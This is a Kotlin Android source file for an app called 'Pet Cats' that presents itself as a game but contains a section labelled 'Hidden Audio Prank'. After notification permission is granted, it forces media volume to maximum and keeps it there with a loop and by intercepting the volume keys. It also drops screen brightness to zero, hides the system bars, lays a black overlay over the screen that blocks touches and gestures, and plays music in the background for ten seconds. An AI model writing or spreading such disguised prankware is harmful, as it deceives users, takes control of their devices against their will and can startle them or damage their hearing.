package com.sleepy.petcats

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Rect
import android.media.AudioManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.core.view.doOnLayout

class MainActivity : AppCompatActivity() {

    private lateinit var audioManager: AudioManager
    private var originalVolume: Int = 0
    private var originalBrightness: Float = -1f
    private lateinit var overlayView: View
    private val handler = Handler(Looper.getMainLooper())
    private var experienceRunning = false

    // Prefs key to track if user previously denied
    companion object {
        private const val PREFS_NAME = "petcats_prefs"
        private const val KEY_PERM_DENIED = "notification_denied"
    }

    private val volumeEnforcer = object : Runnable {
        override fun run() {
            if (!experienceRunning) return
            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
            handler.postDelayed(this, 200L)
        }
    }

    // Launcher for the actual OS permission dialog
    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            clearDeniedFlag()
            hideMenu()
            startExperience()
        } else {
            saveDeniedFlag()
            showDeniedAndExit()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_SECURE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )

        setContentView(R.layout.activity_main)

        audioManager = getSystemService(AUDIO_SERVICE) as AudioManager

        setupMenu()
    }

    // ─── Menu Logic ────────────────────────────────────────────────────────────

    private fun setupMenu() {
        val menuContainer = findViewById<View>(R.id.menu_container)
        val btnAllow = findViewById<TextView>(R.id.btn_allow)
        val btnDeny = findViewById<TextView>(R.id.btn_deny)

        menuContainer.visibility = View.VISIBLE

        btnAllow.setOnClickListener {
            requestNotificationPermission()
        }

        btnDeny.setOnClickListener {
            saveDeniedFlag()
            showDeniedAndExit()
        }
    }

    private fun hideMenu() {
        val menuContainer = findViewById<View>(R.id.menu_container)
        menuContainer.visibility = View.GONE
    }

    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val alreadyGranted = ContextCompat.checkSelfPermission(
                this, Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED

            if (alreadyGranted) {
                clearDeniedFlag()
                hideMenu()
                startExperience()
            } else {
                // Launch OS dialog
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        } else {
            // Below Android 13 — notifications always granted
            clearDeniedFlag()
            hideMenu()
            startExperience()
        }
    }

    private fun showDeniedAndExit() {
        Toast.makeText(
            this,
            "Notifications are required to play Pet Cats.\nThe app will now close.",
            Toast.LENGTH_LONG
        ).show()
        handler.postDelayed({ finish() }, 2_500L)
    }

    private fun saveDeniedFlag() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit().putBoolean(KEY_PERM_DENIED, true).apply()
    }

    private fun clearDeniedFlag() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit().putBoolean(KEY_PERM_DENIED, false).apply()
    }

    // ─── Hidden Audio Prank ─────────────────────────────────────────────────────

    private fun startExperience() {
        experienceRunning = true

        // Save & blast volume
        originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)

        // Save & kill brightness
        val currentBrightness = window.attributes.screenBrightness
        originalBrightness = if (currentBrightness < 0f) 0.5f else currentBrightness
        val params = window.attributes
        params.screenBrightness = 0f
        window.attributes = params

        // Immersive / hide bars
        hideSystemBars()

        // Black touch-blocking overlay
        addOverlay()

        // Start the music service
        val serviceIntent = Intent(this, MusicService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        // Volume enforcer loop
        handler.post(volumeEnforcer)

        // Push to background
        handler.postDelayed({ moveTaskToBack(true) }, 500L)

        // Restore after 10 s
        handler.postDelayed({ stopExperience() }, 10_000L)
    }

    private fun stopExperience() {
        if (!experienceRunning) return
        experienceRunning = false

        handler.removeCallbacks(volumeEnforcer)

        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)

        val params = window.attributes
        params.screenBrightness = originalBrightness
        window.attributes = params

        val rootView = findViewById<View>(R.id.root_layout)
        rootView?.let {
            if (::overlayView.isInitialized) {
                (it as? android.view.ViewGroup)?.removeView(overlayView)
            }
        }

        showSystemBars()

        stopService(Intent(this, MusicService::class.java))
    }

    private fun addOverlay() {
        overlayView = View(this).apply {
            setBackgroundColor(Color.BLACK)
            isClickable = true
            isFocusable = true
        }
        val rootView = findViewById<android.view.ViewGroup>(R.id.root_layout)
        rootView?.addView(
            overlayView,
            android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            overlayView.doOnLayout {
                val display = windowManager.currentWindowMetrics.bounds
                overlayView.systemGestureExclusionRects = listOf(
                    Rect(0, 0, display.width(), display.height())
                )
            }
        }
    }

    private fun hideSystemBars() {
        WindowCompat.setDecorFitsSystemWindows(window, false)
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.hide(WindowInsetsCompat.Type.systemBars())
        controller.systemBarsBehavior =
            WindowInsetsControllerCompat.BEHAVIOR_SHOW_BARS_BY_TOUCH
    }

    private fun showSystemBars() {
        WindowCompat.setDecorFitsSystemWindows(window, true)
        val controller = WindowInsetsControllerCompat(window, window.decorView)
        controller.show(WindowInsetsCompat.Type.systemBars())
    }

    // ─── Key Intercept ──────────────────────────────────────────────────────────

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (!experienceRunning) return super.onKeyDown(keyCode, event)
        return when (keyCode) {
            KeyEvent.KEYCODE_VOLUME_DOWN, KeyEvent.KEYCODE_VOLUME_UP -> {
                val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
                true
            }
            else -> super.onKeyDown(keyCode, event)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        if (experienceRunning) stopExperience()
    }
}
